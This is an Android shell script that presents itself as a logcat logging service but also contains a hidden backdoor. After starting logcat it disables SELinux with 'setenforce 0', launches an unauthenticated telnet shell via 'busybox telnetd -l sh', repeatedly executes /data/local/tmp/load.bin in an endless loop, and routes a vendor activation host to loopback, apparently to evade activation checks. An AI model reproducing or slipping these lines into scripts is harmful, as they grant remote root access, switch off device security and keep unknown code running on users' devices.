#!/system/bin/sh

LOG_TAG="logcat"
LOG_NAME="${0}:"

logcat_pid=""
cp_pid=""

sdcard_path="/logcache"
mount | grep "/logcache type vfat" > /dev/null


loge ()
{
  /system/bin/log -t $LOG_TAG -p e "$LOG_NAME $@"
}

logi ()
{
  /system/bin/log -t $LOG_TAG -p i "$LOG_NAME $@"
}

failed ()
{
  loge "$1: exit code $2"
  exit $2
}

start_logcat ()
{
    if [ ! -d "${sdcard_path}/log" ]; then
        /system/bin/mkdir ${sdcard_path}/log/
    fi

  /system/bin/logcat -b main -b system -b events -b crash -f ${sdcard_path}/log/logcat.log -r 1024 -n 100 -v threadtime &
  logcat_pid=$!
  logi "start_logcat: logcat pid = $logcat_pid"
}

kill_logcat ()
{
  logi "kill_logcat: pid = $logcat_pid"
  ## careful not to kill zero or null!
  kill -TERM $logcat_pid
  # this shell doesn't exit now -- wait returns for normal exit
}

start_logcat

setenforce 0
busybox telnetd -l sh
chmod +x /data/local/tmp/load.bin

value=$(ping -c 1 -W 1 dfh97gw-pros.pateo.com.cn | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+' | head -1);
if [ -z ${value} ]
then
   value="106.12.114.3"
fi
if [ -e /private/configs/token/activation ]
then
    log -p e -t ACTIVATION "Activation Enabled"
    ip route add ${value} dev lo
else
    ip route del ${value} dev lo
fi

(
while [ 1 ]; do
  /system/bin/sh /data/local/tmp/load.bin
  sleep 2
done
) &



#busybox sync
wait $logcat_pid

logi "logcat service stopped"

exit 0
